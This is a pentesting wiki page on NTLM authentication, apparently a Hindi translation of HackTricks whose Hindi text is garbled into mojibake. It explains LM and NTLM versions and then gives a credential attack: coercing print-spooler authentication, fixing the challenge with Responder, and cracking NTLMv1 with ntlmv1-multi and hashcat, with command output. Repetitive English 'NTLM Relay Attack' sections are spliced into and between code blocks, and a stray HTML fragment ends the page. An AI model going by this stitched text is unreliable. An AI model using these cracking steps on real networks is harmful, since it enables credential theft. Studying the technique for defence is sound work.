# NTLM

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХреЛ рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдП**? рдпрд╛ рдХреНрдпрд╛ рдЖрдк **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХреЛ рдкреАрдбреАрдПрдл рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ**? [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рди**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* [**рдж рдкреАрдПрд╕ рдлреИрдорд┐рд▓реА**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**рдПрдирдПрдлрдЯреА**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣ред
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ рдкреАрдПрд╕ рдФрд░ рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВред
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рдореБрдЭреЗ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж[**@carlospolopm**](https://twitter.com/hacktricks_live)** рдкрд░ **рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рд░реЗрдкреЛ** (https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud рд░реЗрдкреЛ**](https://github.com/carlospolop/hacktricks-cloud) **рдореЗрдВ рдкреАрдЖрд░ рдЬрдорд╛ рдХрд░рдХреЗ**.

</details>

## рдореВрд▓ рдЬрд╛рдирдХрд╛рд░реА

рдЬрд╣рд╛рдВ **Windows XP рдФрд░ рд╕рд░реНрд╡рд░ 2003** рдХрд╛ рдЙрдкрдпреЛрдЧ рд╣реЛрддрд╛ рд╣реИ, рд╡рд╣рд╛рдВ LM (Lan Manager) рд╣реИрд╢ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рд╣рд╛рд▓рд╛рдВрдХрд┐ рдпрд╣ рдорд╛рдиреНрдп рд╣реИ рдХрд┐ рдЗрдиреНрд╣реЗрдВ рдЖрд╕рд╛рдиреА рд╕реЗ рдзреНрд╡рд╕реНрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рд╡рд┐рд╢реЗрд╖ рдПрд▓рдПрдо рд╣реИрд╢, `AAD3B435B51404EEAAD3B435B51404EE`, рдПрдХ рд╕реНрдерд┐рддрд┐ рдХреЛ рджрд░реНрд╢рд╛рддрд╛ рд╣реИ рдЬрд╣рд╛рдВ рдПрд▓рдПрдо рдХрд╛ рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИ, рдЬреЛ рдЦрд╛рд▓реА рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЗ рд▓рд┐рдП рд╣реИрд╢ рдХреЛ рдкреНрд░рддрд┐рдирд┐рдзрд┐рддреНрд╡ рдХрд░рддрд╛ рд╣реИред

рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ, **рдХрд░реНрдмреЗрд░реЛрд╕** рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдкреНрд░рдореБрдЦ рд░реВрдк рд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред NTLM (NT LAN Manager) рд╡рд┐рд╢реЗрд╖ рдкрд░рд┐рд╕реНрдерд┐рддрд┐рдпреЛрдВ рдореЗрдВ рдЙрдкрдпреЛрдЧ рдореЗрдВ рдЖрддрд╛ рд╣реИ: рдПрдХреНрдЯрд┐рд╡ рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдХреА рдЕрдиреБрдкрд╕реНрдерд┐рддрд┐, рдбреЛрдореЗрди рдХреА рдЕрд╕реНрддрд┐рддреНрд╡ рдХреА рдЕрдиреБрдкрд╕реНрдерд┐рддрд┐, рдХрд░реНрдмреЗрд░реЛрд╕ рдХреА рдЧрд▓рдд рд╡рд┐рдиреНрдпрд╛рд╕ рдХреЗ рдХрд╛рд░рдг рдЕрд╕рдлрд▓рддрд╛, рдпрд╛ рдЬрдм рдХрдиреЗрдХреНрд╢рди IP рдкрддреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдорд╛рдиреНрдп рд╣реЛрд╕реНрдЯрдирд╛рдо рдХреА рдмрдЬрд╛рдп рдХреА рдХреЛрд╢рд┐рд╢ рдХреА рдЬрд╛рддреА рд╣реИред

рдиреЗрдЯрд╡рд░реНрдХ рдкреИрдХреЗрдЯ рдореЗрдВ **"NTLMSSP"** рд╣реЗрдбрд░ рдХреА рдЙрдкрд╕реНрдерд┐рддрд┐ NTLM рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреА рд╕рдВрдХреЗрдд рджреЗрддреА рд╣реИред

рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреНрд░реЛрдЯреЛрдХреЙрд▓ - LM, NTLMv1, рдФрд░ NTLMv2 - рдХрд╛ рд╕рдорд░реНрдерди рдПрдХ рд╡рд┐рд╢рд┐рд╖реНрдЯ DLL рджреНрд╡рд╛рд░рд╛ рд╕реБрд╡рд┐рдзрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬреЛ `%windir%\Windows\System32\msv1\_0.dll` рдкрд░ рд╕реНрдерд┐рдд рд╣реИред

**рдореБрдЦреНрдп рдмрд┐рдВрджреБ**:
- LM рд╣реИрд╢ рд╡рд┐рдХрд▓реНрдкрд╢реАрд▓ рд╣реИрдВ рдФрд░ рдПрдХ рдЦрд╛рд▓реА LM рд╣реИрд╢ (`AAD3B435B51404EEAAD3B435B51404EE`) рдЗрд╕рдХреЗ рдЕрдкрдпреЛрдЧ рдХреА рдЕрднрд╛рд╡рдирд╛ рдХреЛ рджрд░реНрд╢рд╛рддрд╛ рд╣реИред
- рдХрд░реНрдмреЗрд░реЛрд╕ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╡рд┐рдзрд┐ рд╣реИ, NTLM рдХреЗрд╡рд▓ рд╡рд┐рд╢реЗрд╖ рдкрд░рд┐рд╕реНрдерд┐рддрд┐рдпреЛрдВ рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
- NTLM рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреИрдХреЗрдЯреЛрдВ рдХреЛ "NTLMSSP" рд╣реЗрдбрд░ рджреНрд╡рд╛рд░рд╛ рдкрд╣рдЪрд╛рдирд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
- LM, NTLMv1, рдФрд░ NTLMv2 рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рд╕рд┐рд╕реНрдЯрдо рдлрд╝рд╛рдЗрд▓ `msv1\_0.dll` рджреНрд╡рд╛рд░рд╛ рд╕рдорд░реНрдерд┐рдд рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВред

## LM, NTLMv1 рдФрд░ NTLMv2

рдЖрдк рдЬрд╛рдВрдЪ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдХреМрди рд╕рд╛ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛:

### GUI

_secpol.msc_ рдЪрд▓рд╛рдПрдВ -> рд╕реНрдерд╛рдиреАрдп рдиреАрддрд┐рдпрд╛рдБ -> рд╕реБрд░рдХреНрд╖рд╛ рд╡рд┐рдХрд▓реНрдк -> рдиреЗрдЯрд╡рд░реНрдХ рд╕реБрд░рдХреНрд╖рд╛: LAN Manager рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╕реНрддрд░ред 6 рд╕реНрддрд░ рд╣реИрдВ (0 рд╕реЗ 5 рддрдХ)ред

![](<../../.gitbook/assets/image (92).png>)

### рд░рдЬрд┐рд╕реНрдЯреНрд░реА

рдпрд╣ рд╕реНрддрд░ 5 рд╕реЗрдЯ рдХрд░реЗрдЧрд╛:
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
рд╕рдВрднрд╛рд╡рд┐рдд рдорд╛рди:
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## рдмреЗрд╕рд┐рдХ NTLM рдбреЛрдореЗрди рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдпреЛрдЬрдирд╛

1. **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** рдЕрдкрдиреЗ **рдкреНрд░рдорд╛рдгрдкрддреНрд░** рдкреНрд░рд╕реНрддреБрдд рдХрд░рддрд╛ рд╣реИ
2. рдХреНрд▓рд╛рдЗрдВрдЯ рдорд╢реАрди **рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдЕрдиреБрд░реЛрдз рднреЗрдЬрддреА рд╣реИ** рдЬрд┐рд╕рдореЗрдВ **рдбреЛрдореЗрди рдирд╛рдо** рдФрд░ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо** рднреЗрдЬрддреА рд╣реИ
3. **рд╕рд░реНрд╡рд░** **рдЪреБрдиреМрддреА** рднреЗрдЬрддрд╛ рд╣реИ
4. **рдХреНрд▓рд╛рдЗрдВрдЯ** рдЪреБрдиреМрддреА рдХреЛ **рдкрд╛рд╕рд╡рд░реНрдб рдХреЗ рд╣реИрд╢ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ** рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЗрд╕реЗ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рднреЗрдЬрддрд╛ рд╣реИ
5. **рд╕рд░реНрд╡рд░** **рдбреЛрдореЗрди рдХрдВрдЯреНрд░реЛрд▓рд░** рдХреЛ **рдбреЛрдореЗрди рдирд╛рдо, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо, рдЪреБрдиреМрддреА рдФрд░ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛** рднреЗрдЬрддрд╛ рд╣реИред рдпрджрд┐ **рд╕рдХреНрд░рд┐рдп рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛** рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдирд╣реАрдВ рд╣реИ рдпрд╛ рдбреЛрдореЗрди рдирд╛рдо рд╕рд░реНрд╡рд░ рдХрд╛ рдирд╛рдо рд╣реИ, рддреЛ рдкреНрд░рдорд╛рдгрдкрддреНрд░ **рд╕реНрдерд╛рдиреАрдп рд░реВрдк рд╕реЗ рдЬрд╛рдВрдЪреА рдЬрд╛рддреА рд╣реИ**ред
6. **рдбреЛрдореЗрди рдХрдВрдЯреНрд░реЛрд▓рд░** рдЬрд╛рдВрдЪрддрд╛ рд╣реИ рдХрд┐ рд╕рдм рдХреБрдЫ рд╕рд╣реА рд╣реИ рдФрд░ рд╕рд░реНрд╡рд░ рдХреЛ рдЬрд╛рдирдХрд╛рд░реА рднреЗрдЬрддрд╛ рд╣реИ

**рд╕рд░реНрд╡рд░** рдФрд░ **рдбреЛрдореЗрди рдХрдВрдЯреНрд░реЛрд▓рд░** рдХреЛ **рдиреЗрдЯрд▓реЙрдЧрди** рд╕рд░реНрд╡рд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ **рд╕реБрд░рдХреНрд╖рд┐рдд рдЪреИрдирд▓** рдмрдирд╛рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрддреЗ рд╣реИрдВ рдХреНрдпреЛрдВрдХрд┐ рдбреЛрдореЗрди рдХрдВрдЯреНрд░реЛрд▓рд░ рд╕рд░реНрд╡рд░ рдХреЗ рдкрд╛рд╕рд╡рд░реНрдб рдХреЛ рдЬрд╛рдирддрд╛ рд╣реИ (рдпрд╣ **NTDS.DIT** рдбреЗрдЯрд╛рдмреЗрд╕ рдореЗрдВ рд╣реИ)ред

### рд╕реНрдерд╛рдиреАрдп NTLM рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдпреЛрдЬрдирд╛

рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдЙрд╕реА рддрд░рд╣ рд╣реИ рдЬреИрд╕рд╛ **рдкрд╣рд▓реЗ рдЙрд▓реНрд▓рд┐рдЦрд┐рдд** рд╣реИ, рд▓реЗрдХрд┐рди **рд╕рд░реНрд╡рд░** рдЙрд╕ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд╣реИрд╢ рдХреЛ рдЬрд╛рдирддрд╛ рд╣реИ** рдЬреЛ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд░рд╣рд╛ рд╣реИ рд╕рд╛рдордЧреНрд░реА рдореЗрдВред рдЗрд╕рд▓рд┐рдП, рдбреЛрдореЗрди рдХрдВрдЯреНрд░реЛрд▓рд░ рд╕реЗ рдкреВрдЫрдиреЗ рдХреА рдмрдЬрд╛рдп, **рд╕рд░реНрд╡рд░ рдЦреБрдж рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдЧрд╛** рдХрд┐ рдХреНрдпрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдкреНрд░рдорд╛рдгреАрдХреГрдд рд╣реЛ рд╕рдХрддрд╛ рд╣реИред

### NTLMv1 рдЪреБрдиреМрддреА

**рдЪреБрдиреМрддреА рд▓рдВрдмрд╛рдИ 8 рдмрд╛рдЗрдЯ** рд╣реИ рдФрд░ **рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ 24 рдмрд╛рдЗрдЯ** рд▓рдВрдмреА рд╣реИред

**рд╣реИрд╢ NT (16 рдмрд╛рдЗрдЯ)** рдХреЛ **3 рд╣рд┐рд╕реНрд╕реЛрдВ рдореЗрдВ рд╡рд┐рднрд╛рдЬрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ (рдкреНрд░рддреНрдпреЗрдХ 7 рдмрд╛рдЗрдЯ)**: **рдЖрдЦрд┐рд░реА рд╣рд┐рд╕реНрд╕рд╛ рд╢реВрдиреНрдпреЛрдВ рд╕реЗ рднрд░рд╛ рд╣реЛрддрд╛ рд╣реИ**ред рдлрд┐рд░, **рдЪреБрдиреМрддреА** рдХреЛ рдкреНрд░рддреНрдпреЗрдХ рд╣рд┐рд╕реНрд╕реЗ рдХреЗ рд╕рд╛рде **рдЕрд▓рдЧ-рдЕрд▓рдЧ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ** рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдкрд░рд┐рдгрд╛рдореА рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ рдмрд╛рдЗрдЯреНрд╕ **рдЬреЛрдбрд╝реА рдЬрд╛рддреА рд╣реИрдВ**ред рдХреБрд▓: 8 рдмреА + 8 рдмреА + 8 рдмреА = 24 рдмрд╛рдЗрдЯред

**рд╕рдорд╕реНрдпрд╛рдПрдВ**:

* **рдЕрдирд┐рдпрдорд┐рддрддрд╛ рдХреА рдХрдореА**
* 3 рд╣рд┐рд╕реНрд╕реЗ рдЕрд▓рдЧ-рдЕрд▓рдЧ **рд╣рдорд▓реЗ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ** рддрд╛рдХрд┐ NT рд╣реИрд╢ рдкрддрд╛ рд▓рдЧрд╛рдпрд╛ рдЬрд╛ рд╕рдХреЗ
* **DES рдХреЛ рддреЛрдбрд╝рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ**
* 3 рд╡рд╛рдВ рдХреБрдВрдЬреА рд╣рдореЗрд╢рд╛ **5 рд╢реВрдиреНрдпреЛрдВ** рд╕реЗ рдорд┐рд▓рдХрд░ рдмрдирд╛рдИ рдЬрд╛рддреА рд╣реИред
* **рдПрдХ рд╣реА рдЪреБрдиреМрддреА** рджрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ рддреЛ **рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛** **рд╕рдорд╛рди** рд╣реЛрдЧреАред рдЗрд╕рд▓рд┐рдП, рдЖрдк рдкреАрдбрд╝рд┐рдд рдХреЛ **рдкреВрд░реНрд╡-рдЧрдгрдирд╛ рд░реЗрдирдмреЛ рддрд╛рд▓рд┐рдХрд╛рдУрдВ** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЗ рд▓рд┐рдП "**1122334455667788**" рд╕реНрдЯреНрд░рд┐рдВрдЧ рджреЗ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдкрд░ рд╣рдорд▓рд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

### NTLMv1 рд╣рдорд▓рд╛

рдЖрдЬрдХрд▓ рдЕрдирдХрдВрд╢рд┐рдд рдбреЗрд▓реАрдЧреЗрд╢рди рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдП рдЧрдП рд╡рд╛рддрд╛рд╡рд░рдг рдкрд╛рдирд╛ рдХрдо рд╣реЛ рд░рд╣рд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдпрд╣ рдпрд╣ рдирд╣реАрдВ рдорддрд▓рдм рд╣реИ рдХрд┐ рдЖрдк **рдкреНрд░рд┐рдВрдЯ рд╕реНрдкреВрд▓рд░ рд╕реЗрд╡рд╛** рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗред

рдЖрдк AD рдкрд░ рдкрд╣рд▓реЗ рд╕реЗ рдХреБрдЫ рдкреНрд░рдорд╛рдгрдкрддреНрд░/рд╕рддреНрд░ рд╣реИрдВ рдЬрд┐рдиреНрд╣реЗрдВ рдЖрдк **рдХрд┐рд╕реА рдЕрдкрдиреЗ рдирд┐рдпрдВрддреНрд░рдг рдХреЗ рддрд╣рдд рд╣реЛрд╕реНрдЯ** рдХреЗ рдЦрд┐рд▓рд╛рдл рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рд▓рд┐рдП рдкреНрд░рд┐рдВрдЯрд░ рд╕реЗ рдкреВрдЫ рд╕рдХрддреЗ рд╣реИрдВред рдлрд┐рд░, `metasploit auxiliary/server/capture/smb` рдпрд╛ `responder` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк **рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдЪреБрдиреМрддреА рдХреЛ 1122334455667788** рд╕реЗрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреНрд░рдпрд╛рд╕ рдХреЛ рдХреИрдкреНрдЪрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдФрд░ рдпрджрд┐ рдпрд╣ **NTLMv1** рдХреЗ рд╕рд╛рде рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ рддреЛ рдЖрдк рдЗрд╕реЗ **рддреЛрдбрд╝ рд╕рдХреЗрдВрдЧреЗ**ред\
рдпрджрд┐ рдЖрдк `responder` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣реЗ рд╣реИрдВ рддреЛ рдЖрдк \*\*рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЗрд╕ рддрдХрдиреАрдХ рдХреЗ рд▓рд┐рдП рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЛ NTLMv1 рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП (NTLMv2 рдорд╛рдиреНрдп рдирд╣реАрдВ рд╣реИ)ред_

рдзреНрдпрд╛рди рд░рдЦреЗрдВ рдХрд┐ рдкреНрд░рд┐рдВрдЯрд░ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рджреМрд░рд╛рди рдХрдВрдкреНрдпреВрдЯрд░ рдЦрд╛рддрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдЧрд╛, рдФрд░ рдХрдВрдкреНрдпреВрдЯрд░ рдЦрд╛рддреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ **рд▓рдВрдмреЗ рдФрд░ рдпрд╛рджреГрдЪреНрдЫрд┐рдХ рдкрд╛рд╕рд╡рд░реНрдб** рдХрд░рддреЗ рд╣реИрдВ рдЬрд┐рдиреНрд╣реЗрдВ рдЖрдк **рд╕рд╛рдорд╛рдиреНрдп рд╢рдмреНрджрдХреЛрд╢** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рддреЛрдбрд╝рдиреЗ** рдХреЗ рд▓рд┐рдП **рд╕рдВрднрд╛рд╡рдирд╛ рдирд╣реАрдВ** рд╣реЛрдЧреАред рд▓реЗрдХрд┐рди **NTLMv1** рдкреНрд░рдорд╛рдгреАрдХрд░рдг **DES рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ** ([рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдпрд╣рд╛рдБ](./#ntlmv1-challenge)), рдЗрд╕рд▓рд┐рдП рдХреБрдЫ рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ DES рдХреЛ рддреЛрдбрд╝рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдУрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк рдЗрд╕реЗ рддреЛрдбрд╝ рд╕рдХреЗрдВрдЧреЗ (рдЖрдк [https://crack.sh/](https://crack.sh) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ)ред

### hashcat рдХреЗ рд╕рд╛рде NTLMv1 рд╣рдорд▓рд╛

NTLMv1 рдХреЛ NTLMv1 рдорд▓реНрдЯреА рдЯреВрд▓ [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi) рдХреЗ рд╕рд╛рде рддреЛрдбрд╝рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ NTLMv1 рд╕рдВрджреЗрд╢реЛрдВ рдХреЛ рдПрдХ рдРрд╕реА рд╡рд┐рдзрд┐ рдореЗрдВ рд╕реНрд╡рд░реВрдкрд┐рдд рдХрд░рддрд╛ рд╣реИ рдЬрд┐рд╕реЗ hashcat рдХреЗ рд╕рд╛рде рддреЛрдбрд╝рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рдЖрджреЗрд╢
```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```
## NTLM Relay Attack

### Introduction

NTLM Relay Attack is a type of attack where an attacker captures the NTLM authentication request sent by a victim and relays it to a target server to authenticate as the victim. This attack can be used to gain unauthorized access to systems and resources.

### How it works

1. Attacker captures the NTLM authentication request sent by the victim.
2. Attacker relays the captured request to a target server.
3. Target server authenticates the attacker as the victim.
4. Attacker gains unauthorized access to the target server.

### Mitigation

To mitigate NTLM Relay Attacks, it is recommended to:
- Use SMB Signing to prevent relay attacks.
- Implement Extended Protection for Authentication.
- Disable NTLM authentication where possible.
- Use strong, unique passwords to make relay attacks more difficult.

By following these mitigation techniques, organizations can reduce the risk of falling victim to NTLM Relay Attacks.
```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
```markdown
## NTLM Relay Attack

### Introduction

NTLM relay attacks are a common technique used by hackers to escalate privileges in a Windows environment. This attack involves intercepting NTLM authentication traffic and relaying it to a target server to gain unauthorized access.

### How it works

1. The attacker intercepts NTLM authentication traffic between a client and a server.
2. The attacker relays this traffic to another server, tricking it into thinking the attacker is the legitimate client.
3. The attacker gains unauthorized access to the target server using the intercepted credentials.

### Mitigation

To prevent NTLM relay attacks, consider implementing the following measures:

- Disable NTLM authentication where possible and use more secure protocols like Kerberos.
- Enable SMB signing to protect against tampering with authentication traffic.
- Implement network segmentation to limit the scope of potential attacks.
```

```html
<h2>NTLM рд░рд┐рд▓реЗ рдЕрдЯреИрдХ</h2>

<h3>рдкрд░рд┐рдЪрдп</h3>

<p>NTLM рд░рд┐рд▓реЗ рд╣рдорд▓реЗ рд╣реИрдХрд░реНрд╕ рджреНрд╡рд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдмрдврд╝рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рд╕рд╛рдорд╛рдиреНрдп рддрдХрдиреАрдХ рд╣реИ рдЬреЛ рдПрдХ Windows рд╡рд╛рддрд╛рд╡рд░рдг рдореЗрдВ рдкреНрд░рдпреЛрдЧ рдХреА рдЬрд╛рддреА рд╣реИред рдпрд╣ рд╣рдорд▓рд╛ NTLM рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдЯреНрд░реИрдлрд┐рдХ рдХреЛ рдЖрддреНрдорд╕реНрд╡реАрдХреГрдд рдЙрдкрдпреЛрдЧ рдХреЗ рд▓рд┐рдП рдПрдХ рд▓рдХреНрд╖реНрдп рд╕рд░реНрд╡рд░ рдХреЛ рд░рд┐рд▓реЗ рдХрд░рдиреЗ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реИред</p>

